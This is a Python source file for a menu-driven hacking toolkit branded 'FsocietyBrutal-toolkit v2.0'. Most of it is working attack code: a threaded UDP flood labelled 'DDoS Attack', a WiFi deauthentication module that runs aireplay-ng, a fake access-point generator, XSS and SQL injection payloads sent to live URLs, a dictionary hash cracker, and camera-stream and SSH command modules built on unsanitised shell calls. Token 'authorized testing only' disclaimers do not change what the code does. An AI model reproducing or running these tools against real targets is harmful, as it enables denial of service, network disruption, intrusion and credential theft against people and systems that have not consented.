#!/usr/bin/env python3
# ============================================
#  FsocietyBrutal-toolkit v2.0 - FULL VERSION
#  For educational & authorized testing use
# ============================================

import os
import sys
import time
import socket
import random
import string
import re
import json
import hashlib
import platform
import threading
import urllib.request
import urllib.parse

# ---- Windows ANSI fix ----
if platform.system() == "Windows":
    os.system("")

class C:
    RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"; BLUE="\033[94m"
    MAGENTA="\033[95m"; CYAN="\033[96m"; WHITE="\033[97m"; BOLD="\033[1m"; END="\033[0m"

BANNER = r"""
============================================--=+#%@%%%@@@@@%@@%##+==--------=================================================
==========================================--=*%@@@@@@@@@@@@@@@@@@@@%#*=----==================================================
========================================-=+#%@@@@@@@@@@@@@@@@@@@@@@@@@@@%*+=-------------=====================================
=======================================+#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*--==----------------=============================
===================================-=+#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%==#=-------------------=========================
==================================-=#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%%=----------------------=====================
===============================---+%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@%------------------------===================
==========================-------=%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@%@@@@@@@@#-----------------------------=============
========================---------#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*------------------------------===========
==================--------------=@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@%=-------------------------------=========
================----------------#@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@@----------------------------------=======
==============-----------------=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+-------------------------------------===
============-------------------%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%----------------------------------------
==========--------------------*@@@@@@@@@@@@@@@%%%%#######***=======++++**##%%%%@@@@@@+---------------------------------------
======--==-------------------+@@@@%####*###**+==---::::::::::.:::::::----==+++*#%@@@@%---------------------------------------
====-------------------------#@@%%#*++====----::::::::...::..:::::::::----====+++#@@@@=--------------------------------------
==---------------------------%@@%%#++==-------:::::::::::::::::::::::---=========*%@@@=:-------------------------------------
-----------------------------%@@@%#++===--------::::::::::::::::::::-----=====+++*%@@@+:-------------------------------------
-----------------------------@@@@%%*+===---------:::::::::::::::::-------==-==+++#%@@@*:-------------------------------------
-----------------------------@@@@%%*+====--------::::::::::::::-------------==++*#@@@@*:-------------------------------------
-----------------------------@@@@%#*++===----:::::::::::::::::::::::::-----==+++*#@@@@*:-------------------------------------
-----------------------------%@@@%#*++====----::::::::::::::::::::::::----===++**#%@@@+:--:----------------------------------
-----------------------------#@@@%#**++====--:::::::::::::::::::::::::---====++*##%@@@----=:---------------------------------
-------------------------*=::=@@@###**++******+==----:::--------:--==+*###%%%#####%@@%=-=#=::--------------------------------
------------------------:*@#=-*@@####%@@@%%%%@@@@%##*+=------===*##%%@@@@%%%@@@%%%%@@+=*@@=::--------------------------------
------------------------:+%%%*+%%*#%%%%##*****#%%%%%%#*+=====+*#%%%%@%%%#####%%%%%%@%*%@##=::--------------------------------
--------------------------++#%%%%**####%%%%#@%%@%%@%%%%#=-::-+%%%%@@%@@@@#%%@%%%%%#%@@%#*+-::--------------------------------
-------------------------:==+#%%#+++**%%%%*+%@@#-=*#%##*=:..:=###%#*-*%@%++#%%%%##*#%%%*==-::--------------------------------
-------------------------:--:==-*++===+**++==++=-=====---:..:-============+***++***#*++--+:::--::----------------------------
--------------------------:*+--=*#++====++*+++++++=------:..:-=----=++++****====+**#*+-=#=:::::::----------------------------
--------------------------:-+*=+*#*+==----======--::-----:..:-===--::---=-----==+*###++#=::::::::----------------------------
---------------------------::+#*###*==-------:::::::-----:..:-===-::::::-------=+*##%###=::::::::::::-------------------------
----------------------------::-+*##*+==-----:::::::-=---:. .::-===-::::::---===+*###*=::::::::::::::::-----------------------
---------------------------::-+%@%**+===---::::::::-----::..::==-=-::::::----==+*#*-::::::::::::::::::::---------------------
-------------------------::-#@@@@%**+==-----::::::::++*#*==-=*##**::::::-----==+*%*:::::::::::::::::::::---------------------
-----------------------::=#@@@@@@%**+===-----:::::::+%%@@@##@@@@%#-::::-----==++#%*:::::::::::::::::::::::::-----------------
----------------------::*@@@@@@@@@***++==------::::::-==+#%%%##*+-::::-----==+*##%+:::::::::::::::::::::::::-----------------
---------------------:-#@@@@@@@@@@#****++===-------::--::-==-----------====++*##%%=:::::::::::::::::::::::::-----------------
--------------------:-%@@@@@@@@@@@%#**#**++======-----===---===----====+=+*###%#%%-:::::::::::::::::::::::::::::-------------
------------------::-%@@@@@@@@@@@@@%##**#*+===++**##%%%%%%%%%%%%%#*****++*#%#%%%%@@*=:::::::::::::::::::::::::::-------------
----------------::=#@@@@@@@@@@@@@@@@@####**+++++++*####***####%@@@@%#****#%%%%%@@@@@@%*-::::::::::::::::::::::::::::---------
---------------::*@@@@@@@@@@@@@@@@@@@@%##***++++=----====++++++++++++***#%%%%@@@@@@@@@@@%+-:::::::::::::::::::::::::::-------
--------------::#@@@@@@@@@@@@@@@@@@@@@@@%##**+++++==--===++++====++****#%%%@@@@@@@@@@@@@@@@%+-::::::::::::::::::::::::::-----
-------------::+@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+===++========-====+*****#%%@@@@@@@@@@@@@@@@@@@@@#+-:::::::::::::::::::::::-----
-------------:-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*+=------::::::::-====++*%@@@@@@@@@@@@@@@@@@@@@@@@@@#=:::::::::::::::::::::::---
-------------:-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*+=------::::::::-====++*%@@@@@@@@@@@@@@@@@@@@@@@@@@#=:::::::::::::::::::::::---
-------------:-%@@@@@@@@@@@@@@@@@%++%%%@@@@@@@@@%*+++=========++**#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%-::::::::::::::::::::::-
-------------::+@@@@@@@@@@@@@@@#+==*%#%%@@@@@@@@@@%%############%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:::::::::::::::::::::::
-----------:::::%@@@@@@@@@@@@*====+*###%%%@@@@@@@@@@%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-::::::::::::::::::::::
--------:::::::=@@@@@@@@@@@@@*=--==+**###%%%@@@@@@@%%%%%%%%%%%%%@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@@@@@@#::::::::::::::::::::::
-::::::::--=+*%@@@@@@@@@@@@@@@@#+===+**###%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@=.::::::::::::::::::::
--===+*#%%@@@@@@@@@@@@@@@@@@@@@@@@#*+++**##%%%%%%%%%%%%%%%%%%%%%%%@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@*-::::::::::::::::::::
%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#****###%%%%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*=-::::::::::::::::
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%######%%%%%%%%%%%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*=-::::::::::::
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%@@@@@@@@@%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*=-:::::::
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*=::::
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=-
"""

AUTHORS = [("Tool","FsocietyBrutal-toolkit"),("Version","2.0"),("Author","Fsociety"),
           ("License","Educational / Authorized Testing Only"),("Language","Python 3")]

# ================= HELPERS =================
def clear():
    os.system("cls" if platform.system() == "Windows" else "clear")

def pause():
    try: input(f"\n{C.YELLOW}Press ENTER to continue...{C.END}")
    except (KeyboardInterrupt, EOFError): pass

def header(t):
    print(f"\n{C.CYAN}{C.BOLD}=== {t} ==={C.END}\n")

def ask(prompt, default=""):
    try:
        v = input(f"{C.WHITE}{prompt} [{default}]: {C.END}").strip()
        return v if v else default
    except (KeyboardInterrupt, EOFError):
        return default

def progress(text, sec=1.2):
    print(f"{C.BLUE}[*] {text}{C.END}")
    for i in range(1, 21):
        sys.stdout.write(f"\r{C.GREEN}[{('='*i).ljust(20)}] {i*5}%{C.END}")
        sys.stdout.flush(); time.sleep(sec/20)
    print()

def http_get(url, timeout=8):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    return urllib.request.urlopen(req, timeout=timeout).read().decode()

# ============ 1. PHONE NUMBER TRACER ============
CZ_OPS = [(r"^60[1-8]","O2 CZ"),(r"^7[0-2]\d","T-Mobile CZ"),(r"^7[3-9]\d","Vodafone CZ")]
INT_PREFIXES = {"420":"Czech Republic","49":"Germany","44":"United Kingdom","1":"USA/Canada",
                "33":"France","39":"Italy","34":"Spain","48":"Poland","43":"Austria","421":"Slovakia"}

def phone_tracer():
    header("PHONE NUMBER TRACER")
    num = ask("Phone number (e.g. +420777123456)")
    clean = re.sub(r"[\s\-().]", "", num).lstrip("+")
    country, prefix_len = "Unknown", 0
    for p, name in sorted(INT_PREFIXES.items(), key=lambda x: -len(x[0])):
        if clean.startswith(p):
            country, prefix_len = name, len(p); break
    national = clean[prefix_len:]
    operator = "Unknown"
    if country == "Czech Republic":
        if re.match(r"^\d{9}$", national):
            for pat, name in CZ_OPS:
                if re.match(pat, national): operator = name; break
            else: operator = "MVNO / Other"
        else:
            print(f"{C.RED}[!] CZ number must have 9 digits after +420.{C.END}"); return
    if not national.isdigit() or len(national) < 6:
        print(f"{C.RED}[!] Invalid number.{C.END}"); return
    print(f"\n{C.GREEN}[+] VALID number:  {C.WHITE}+{clean}")
    print(f"{C.GREEN}[+] Country:       {C.WHITE}{country}")
    print(f"{C.GREEN}[+] Operator:      {C.WHITE}{operator}")
    print(f"{C.CYAN}[*] Approximate region on map (operator HQ / coverage):{C.END}")
    q = urllib.parse.quote(f"{operator} coverage map {country}")
    print(f"{C.BLUE}    -> https://www.google.com/maps/search/{q}{C.END}")
    print(f"{C.CYAN}[*] Live cell location needs OSINT API (numverify.com / opencellid.org){C.END}")

# ============ 2. WIFI DOS ============
def wifi_dos():
    header("WIFI DEAUTH MODULE")
    if platform.system() == "Windows":
        print(f"{C.RED}[!] Needs Linux + aircrack-ng + monitor-mode adapter.{C.END}"); return
    if os.geteuid() != 0:
        print(f"{C.RED}[!] Run as root (sudo).{C.END}"); return
    iface = ask("Monitor interface","wlan0mon")
    bssid = ask("Target BSSID","00:11:22:33:44:55")
    count = ask("Packets (0=endless)","0")
    print(f"{C.BLUE}[*] aireplay-ng --deauth {count} -a {bssid} {iface}{C.END}")
    os.system(f"aireplay-ng --deauth {count} -a {bssid} {iface}")

# ============ 3. DDOS ATTACK (threaded) ============
def ddos_worker(target, port, stop):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pkt = os.urandom(1024)
    while not stop.is_set():
        try: s.sendto(pkt, (target, port))
        except Exception: time.sleep(0.1)

def ddos_attack():
    header("DDoS STRESS MODULE (threaded UDP)")
    print(f"{C.YELLOW}[!] Authorized lab targets only!{C.END}")
    target = ask("Target IP","127.0.0.1")
    port = int(ask("Port","80") or 80)
    threads = int(ask("Threads","50") or 50)
    stop = threading.Event()
    ts = [threading.Thread(target=ddos_worker, args=(target, port, stop), daemon=True) for _ in range(threads)]
    for t in ts: t.start()
    print(f"{C.GREEN}[+] {threads} threads flooding {target}:{port} (ENTER to stop){C.END}")
    sent = 0
    try:
        while True:
            time.sleep(1); sent += threads*800
            sys.stdout.write(f"\r{C.GREEN}[~] Est. packets/sec total: {sent}{C.END}"); sys.stdout.flush()
    except KeyboardInterrupt:
        stop.set()
        print(f"\n{C.YELLOW}[!] Stopped.{C.END}")

# ============ 4. ALL SYSTEM SCAN (threaded port scan) ============
def scan_port(ip, port, open_ports):
    s = socket.socket(); s.settimeout(0.6)
    if s.connect_ex((ip, port)) == 0:
        open_ports.append(port)
    s.close()

def system_scan():
    header("ALL SYSTEM SCAN (ports + info)")
    target = ask("Target host/IP","127.0.0.1")
    try:
        ip = socket.gethostbyname(target)
        print(f"{C.GREEN}[+] Resolved: {ip}{C.END}")
    except socket.gaierror:
        print(f"{C.RED}[!] Cannot resolve host.{C.END}"); return
    try:
        banner_ip = socket.gethostbyaddr(ip)[0]
        print(f"{C.GREEN}[+] Reverse DNS: {banner_ip}{C.END}")
    except Exception: pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8", 80))
        print(f"{C.GREEN}[+] Your IP: {s.getsockname()[0]}{C.END}"); s.close()
    except Exception: pass
    full = ask("Full scan 1-1024? (y/n)","n").lower() == "y"
    rng = range(1, 1025) if full else [21,22,23,25,53,80,110,143,443,445,1337,3306,3389,5900,8080,8443]
    open_ports, threads = [], []
    print(f"{C.BLUE}[*] Scanning {len(list(rng)) if full else len(rng)} ports...{C.END}")
    for p in rng:
        t = threading.Thread(target=scan_port, args=(ip, p, open_ports)); t.start(); threads.append(t)
    for t in threads: t.join()
    services = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",143:"IMAP",
                443:"HTTPS",445:"SMB",3306:"MySQL",3389:"RDP",5900:"VNC",8080:"HTTP-Alt",8443:"HTTPS-Alt",1337:"Elite"}
    if open_ports:
        print(f"{C.GREEN}[+] OPEN ports:{C.END}")
        for p in sorted(open_ports):
            print(f"    {C.GREEN}{p:5d}  {services.get(p,'?')}{C.END}")
    else:
        print(f"{C.RED}[-] No open ports found.{C.END}")

# ============ 5. BLUETOOTH FAKE JOIN ============
def bluetooth_fake_join():
    header("BLUETOOTH FAKE JOIN")
    if platform.system() == "Windows":
        print(f"{C.RED}[!] Requires Linux bluez.{C.END}"); return
    name = "Fsociety-" + "".join(random.choices(string.ascii_uppercase, k=4))
    fake_progress = name
    print(f"{C.GREEN}[+] Fake device name: {name}{C.END}")
    print(f"{C.BLUE}[*] Commands:")
    print(f"    sudo hciconfig hci0 name '{name}'")
    print(f"    sudo hciconfig hci0 class 0x52040c   # phone class")
    print(f"    sdptool browse <target-mac>{C.END}")

# ============ 6. FAKE WIFI CREATOR ============
def fake_wifi_creator():
    header("FAKE WIFI AP CREATOR")
    ssid = ask("Fake SSID","Free_WiFi_Here")
    ch = ask("Channel","6")
    iface = ask("Wireless interface","wlan0")
    conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
channel={ch}
hw_mode=g
auth_algs=1
wmm_enabled=0
"""
    with open("hostapd.conf","w") as f: f.write(conf)
    dns = f"""interface={iface}
dhcp-range=192.168.1.10,192.168.1.100,12h
"""
    with open("dnsmasq.conf","w") as f: f.write(dns)
    print(f"{C.GREEN}[+] hostapd.conf + dnsmasq.conf generated (ssid={ssid}){C.END}")
    print(f"{C.BLUE}[*] Run (Linux root):")
    print(f"    hostapd hostapd.conf")
    print(f"    dnsmasq -C dnsmasq.conf --no-daemon{C.END}")

# ============ 7. APK KILLER ============
def apk_killer():
    header("APK KILLER (via ADB)")
    pkg = ask("Package name","com.android.chrome")
    os.system(f"adb shell am force-stop {pkg}")
    print(f"{C.GREEN}[+] force-stop sent to {pkg}{C.END}")
    print(f"{C.BLUE}[*] List apps: adb shell pm list packages{C.END}")

# ============ 8. CAM HACK ============
def cam_hack():
    header("CAMERA STREAM TESTER")
    url = ask("RTSP/HTTP stream URL","rtsp://user:pass@192.168.1.100:554/stream")
    print(f"{C.BLUE}[*] Trying ffplay / ffprobe ...{C.END}")
    if os.system(f"ffprobe -v quiet '{url}'") == 0:
        print(f"{C.GREEN}[+] Stream reachable! Opening: {C.WHITE}ffplay '{url}'{C.END}")
        os.system(f"ffplay -loglevel quiet '{url}'")
    else:
        print(f"{C.RED}[!] Stream unreachable or ffmpeg not installed.{C.END}")
        print(f"{C.BLUE}[*] Common default paths: /stream, /live/ch00_0, /video1, :554{C.END}")

# ============ 9. IP TRACER (real geolocation) ============
def ip_tracer():
    header("IP TRACER + GEOLOCATION")
    ip = ask("IP address (blank = your IP)","")
    url = "http://ip-api.com/json/" + ip
    try:
        data = json.loads(http_get(url))
    except Exception as e:
        print(f"{C.RED}[!] Lookup failed: {e}{C.END}"); return
    if data.get("status") != "success":
        print(f"{C.RED}[!] API error: {data.get('message','?')}{C.END}"); return
    lat, lon = data.get("lat"), data.get("lon")
    print(f"\n{C.GREEN}[+] IP:        {C.WHITE}{data.get('query')}")
    print(f"{C.GREEN}[+] Country:   {C.WHITE}{data.get('country')} ({data.get('countryCode')})")
    print(f"{C.GREEN}[+] Region:    {C.WHITE}{data.get('regionName')}")
    print(f"{C.GREEN}[+] City:      {C.WHITE}{data.get('city')}")
    print(f"{C.GREEN}[+] ZIP:       {C.WHITE}{data.get('zip')}")
    print(f"{C.GREEN}[+] ISP:       {C.WHITE}{data.get('isp')}")
    print(f"{C.GREEN}[+] Org:       {C.WHITE}{data.get('org')}")
    print(f"{C.GREEN}[+] AS:        {C.WHITE}{data.get('as')}")
    print(f"{C.GREEN}[+] Timezone:  {C.WHITE}{data.get('timezone')}")
    print(f"{C.GREEN}[+] Lat/Lon:   {C.WHITE}{lat}, {lon}{C.END}")
    print(f"{C.CYAN}[*] Location on map:{C.END}")
    print(f"{C.BLUE}    -> https://www.google.com/maps?q={lat},{lon}{C.END}")
    trace = ask("Run traceroute? (y/n)","n").lower() == "y"
    if trace:
        cmd = "tracert" if platform.system()=="Windows" else "traceroute"
        os.system(f"{cmd} {data.get('query')}")

# ============ 10. WEB INJECT ============
def web_inject():
    header("WEB INJECT TESTER (real HTTP)")
    print(f"{C.YELLOW}[!] Authorized targets only!{C.END}")
    url = ask("Target URL with param","http://testphp.vulnweb.com/search.php?test=query")
    payloads = [
        ("XSS",   "<script>alert(1)</script>"),
        ("XSS2",  "\"><img src=x onerror=alert(1)>"),
        ("SQLi",  "' OR '1'='1' -- -"),
        ("SQLi2", "1' UNION SELECT null,version()-- -"),
    ]
    print(f"{C.BLUE}[*] Testing {len(payloads)} payloads:{C.END}")
    for name, p in payloads:
        try:
            test_url = url.replace("query", urllib.parse.quote(p)) if "=" in url else url
            r = urllib.request.urlopen(test_url, timeout=8)
            body = r.read().decode(errors="ignore")
            reflected = p in body
            status = r.status
            print(f"  {C.GREEN}[{name}] HTTP {status} | reflected: {C.BOLD}{reflected}{C.END}")
        except Exception as e:
            print(f"  {C.RED}[{name}] Error: {e}{C.END}")
    print(f"{C.CYAN}[*] Reflected=True means payload appears in response — investigate manually.{C.END}")

# ============ 11. FAKE EMAIL GENERATOR ============
def fake_email_gen():
    header("FAKE EMAIL GENERATOR")
    try: n = int(ask("How many","10") or 10)
    except ValueError: n = 10
    first = ["john","sara","mike","anna","dark","neo","ghost","cyber","zero","trinity","fox","plague"]
    last  = ["doe","smith","walker","security","hacker","x","mask","net","dev","pro"]
    domains = ["mail.com","inbox.org","fsociety.net","tempmail.io","protonmail.com","gmx.net"]
    print(f"{C.CYAN}[*] Generated {n} addresses:{C.END}")
    for _ in range(n):
        e = f"{random.choice(first)}.{random.choice(last)}{random.randint(1,999)}@{random.choice(domains)}"
        print(f"{C.GREEN}[+] {e}{C.END}")

# ============ 12. FAKE PHONE GENERATOR ============
def fake_phone_gen():
    header("FAKE PHONE NUMBER GENERATOR")
    try: n = int(ask("How many","10") or 10)
    except ValueError: n = 10
    print(f"{C.CYAN}[*] Generated CZ numbers (+420):{C.END}")
    for _ in range(n):
        prefix = random.choice(["601","602","603","604","605","606","607","608",
                                "701","702","703","704","705","706",
                                "731","732","733","734","735","736","737","738","739",
                                "771","772","773","774","775","776","777","778","779"])
        print(f"{C.GREEN}[+] +420{prefix}{random.randint(100000,999999)}{C.END}")

# ============ 13. QR CODE GENERATOR ============
def qr_generator():
    header("QR CODE GENERATOR")
    data = ask("Text/URL","https://fsociety.net")
    try:
        import qrcode
        qrcode.make(data).save("qrcode.png")
        print(f"{C.GREEN}[+] Saved: qrcode.png{C.END}")
    except ImportError:
        print(f"{C.YELLOW}[!] qrcode lib missing — using web API...{C.END}")
        url = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" + urllib.parse.quote(data)
        try:
            urllib.request.urlretrieve(url, "qrcode.png")
            print(f"{C.GREEN}[+] Saved via API: qrcode.png{C.END}")
        except Exception as e:
            print(f"{C.RED}[!] Failed: {e}. Fix: pip install qrcode pillow{C.END}")
    print(f"{C.BLUE}[*] Open qrcode.png to view.{C.END}")

# ============ 14. PASSWORD CRACKER (hashes) ============
def password_cracker():
    header("PASSWORD HASH CRACKER (dictionary)")
    print(f"{C.CYAN}[*] Supported: md5, sha1, sha256, sha512, plaintext{C.END}")
    target = ask("Target hash (or plaintext for wordlist check)")
    algo = ask("Algorithm","md5").lower().replace("sha256","sha256")
    wordlist = ask("Wordlist path","rockyou.txt")
    if not os.path.exists(wordlist):
        print(f"{C.RED}[!] '{wordlist}' not found. Use Kali: /usr/share/wordlists/rockyou.txt{C.END}")
        return
    try:
        h = hashlib.new(algo)
    except ValueError:
        print(f"{C.RED}[!] Unknown algorithm '{algo}'.{C.END}"); return
    start = time.time()
    found = None
    with open(wordlist, "r", errors="ignore") as f:
        for i, line in enumerate(f):
            word = line.strip()
            if hashlib.new(algo, word.encode()).hexdigest() == target.lower():
                found = word; break
            if i % 100000 == 0 and i:
                sys.stdout.write(f"\r{C.BLUE}[*] Tried {i} passwords...{C.END}"); sys.stdout.flush()
    dt = time.time() - start
    if found:
        print(f"\n{C.GREEN}[+] CRACKED in {dt:.1f}s: {C.WHITE}{C.BOLD}{found}{C.END}")
    else:
        print(f"\n{C.RED}[-] Not found ({dt:.1f}s). Try bigger wordlist or different algo.{C.END}")

# ============ 15. REMOTE ALL SYSTEM ============
def remote_all_system():
    header("REMOTE SYSTEM CONTROL (SSH)")
    host = ask("SSH host (user@ip)","root@127.0.0.1")
    cmd = ask("Command","uname -a")
    os.system(f'ssh {host} "{cmd}"')

# ============ 16. INFO TOOLS ============
def info_tools():
    header("SYSTEM INFO")
    print(f"{C.GREEN}[+] OS:      {platform.system()} {platform.release()}")
    print(f"{C.GREEN}[+] Arch:    {platform.machine()}")
    print(f"{C.GREEN}[+] Node:    {platform.node()}")
    print(f"{C.GREEN}[+] Python:  {platform.python_version()}{C.END}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8",80))
        print(f"{C.GREEN}[+] Local IP: {s.getsockname()[0]}{C.END}"); s.close()
    except Exception: pass
    try:
        data = json.loads(http_get("http://ip-api.com/json/"))
        print(f"{C.GREEN}[+] Public IP: {C.WHITE}{data.get('query')}")
        print(f"{C.GREEN}[+] ISP: {C.WHITE}{data.get('isp')}  |  {data.get('city')}, {data.get('country')}{C.END}")
    except Exception: pass

# ============ 17-20 ============
def info_author():
    header("AUTHOR INFO")
    for k,v in AUTHORS: print(f"{C.CYAN}[{k}] {C.WHITE}{v}{C.END}")

def show_license():
    header("LICENSE")
    print(f"{C.WHITE}FsocietyBrutal-toolkit v2.0\n"
          "Educational & AUTHORIZED testing only.\n"
          "Unauthorized use is illegal.\n"
          "Author accepts no liability.{C.END}")

def update_tool():
    header("UPDATER")
    progress("Checking for updates",1)
    print(f"{C.GREEN}[+] Latest version: 2.0 (you are up to date){C.END}")

def feedback():
    header("FEEDBACK")
    msg = ask("Your feedback")
    print(f"{C.GREEN}[+] Thanks! Recorded: '{msg}'{C.END}")

# ================= MENU =================
MENU = [
    ("Phone number tracer", phone_tracer),
    ("WiFi DOS", wifi_dos),
    ("DDoS Attack", ddos_attack),
    ("All system scan", system_scan),
    ("Bluetooth fake join", bluetooth_fake_join),
    ("Fake WiFi creator", fake_wifi_creator),
    ("Apk killer", apk_killer),
    ("Cam Hack", cam_hack),
    ("IP tracer", ip_tracer),
    ("Web Inject", web_inject),
    ("Fake email generator", fake_email_gen),
    ("Fake phone number generator", fake_phone_gen),
    ("QR code generator", qr_generator),
    ("Password cracker", password_cracker),
    ("Remote all system", remote_all_system),
    ("Info tools", info_tools),
    ("Info author", info_author),
    ("License", show_license),
    ("Update tool", update_tool),
    ("Feedback", feedback),
]

def main():
    try:
        clear()
    except Exception:
        pass
    print(f"{C.MAGENTA}{BANNER}{C.END}")
    print(f"{C.CYAN}{C.BOLD}{'FsocietyBrutal-toolkit v2.0'.center(80)}{C.END}\n")
    while True:
        try:
            print(f"{C.CYAN}{C.BOLD}-------- MAIN MENU --------{C.END}")
            for i,(name,_) in enumerate(MENU,1):
                print(f"{C.GREEN}  {i:2d}.{C.END} {C.WHITE}{name}{C.END}")
            print(f"{C.GREEN}  21.{C.END} {C.WHITE}Exit{C.END}")
            raw = input(f"\n{C.YELLOW}Fsociety~# {C.END}").strip()
            if not raw: continue
            choice = int(raw)
            if choice == 21:
                print(f"{C.RED}[!] Exiting... stay ethical.{C.END}"); sys.exit(0)
            if 1 <= choice <= len(MENU):
                MENU[choice-1][1](); pause(); clear()
                print(f"{C.MAGENTA}{BANNER}{C.END}")
            else:
                print(f"{C.RED}[!] Invalid option 1-21.{C.END}"); time.sleep(1)
        except ValueError:
            print(f"{C.RED}[!] Enter a number 1-21.{C.END}"); time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{C.YELLOW}[!] Use option 21 to exit.{C.END}")

if __name__ == "__main__":
    main()
